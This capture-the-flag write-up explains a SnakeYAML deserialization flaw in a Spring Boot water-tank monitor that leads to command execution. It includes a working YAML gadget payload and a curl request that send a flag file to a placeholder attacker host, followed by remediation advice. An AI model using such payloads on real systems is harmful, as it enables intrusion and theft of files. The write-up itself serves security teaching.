Watersnake Writeup

Overview

Watersnake is a Spring Boot application used to monitor water tank levels. The application exposes a firmware update endpoint that accepts YAML input. The vulnerability is caused by unsafe SnakeYAML deserialization, allowing attacker-controlled Java object creation.

Key Routes

The main controller defines three routes:

- "/" redirects to "/index.html"
- "/stats" returns fake water tank sensor readings
- "/update" accepts YAML firmware configuration data

The vulnerable endpoint is:

@PostMapping("/update")
public String update(@RequestParam(name = "config") String updateConfig) {
    InputStream is = new ByteArrayInputStream(updateConfig.getBytes());
    Yaml yaml = new Yaml();
    Map<String, Object> obj = yaml.load(is);
    obj.forEach((key, value) -> System.out.println(key + ":" + value));
    return "Config queued for firmware update";
}

The issue is the use of:

Yaml yaml = new Yaml();
yaml.load(is);

This allows SnakeYAML to deserialize arbitrary Java types.

Vulnerable Dependency

The application uses SnakeYAML "1.33":

<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.33</version>
</dependency>

This version is affected by unsafe deserialization behavior, commonly associated with CVE-2022-1471.

Gadget Class

The useful class is "GetWaterLevel":

public GetWaterLevel(String value) {
    initiateSensor(value);
}

The constructor calls "initiateSensor()", which calls "readFromSensor()".

public void initiateSensor(String value) {
    try {
        readFromSensor(value);
    } catch (IOException e) {
        System.out.println(e.getMessage());
    }
}

"readFromSensor()" executes the provided string as a system command:

ProcessBuilder processBuilder = new ProcessBuilder(value.split("\\s+"));
Process process = processBuilder.start();

So if SnakeYAML can be made to instantiate "GetWaterLevel", the constructor argument becomes a command.

Exploit Concept

A YAML payload can instantiate the class directly:

!!com.lean.watersnake.GetWaterLevel ["curl -d @/flag.txt -X POST http://ATTACKER"]

When deserialized, this creates a new "GetWaterLevel" object and passes the string into its constructor.

That triggers:

GetWaterLevel(String value)
 → initiateSensor(value)
 → readFromSensor(value)
 → ProcessBuilder(...)

Because the command output is not returned in the HTTP response, this is a blind command execution bug. The flag must be exfiltrated out-of-band.

Example Request

curl -X POST http://TARGET/update \
  --data-urlencode 'config=!!com.lean.watersnake.GetWaterLevel ["curl -d @/flag.txt -X POST http://ATTACKER"]'

Why It Worked

The firmware update endpoint trusted user-supplied YAML and parsed it with an unsafe SnakeYAML loader. Since the application had a class whose constructor executed a command, the attacker could instantiate that class through YAML and pass an arbitrary command as the constructor argument.

The application did not need an explicit command injection in the controller. The command execution happened indirectly through object construction during deserialization.

Remediation

Safer fixes include:

- Do not use "new Yaml().load()" on untrusted input.
- Use "SafeConstructor" or a restricted loader.
- Deserialize only into known DTO classes.
- Avoid constructors with side effects.
- Never execute system commands from values derived from user input.
- Upgrade SnakeYAML and Spring Boot dependencies.
- Validate firmware update configuration against a strict schema.

Root Cause

The root cause was unsafe deserialization of attacker-controlled YAML combined with a class constructor that executed system commands.

This created a deserialization-to-command-execution path.
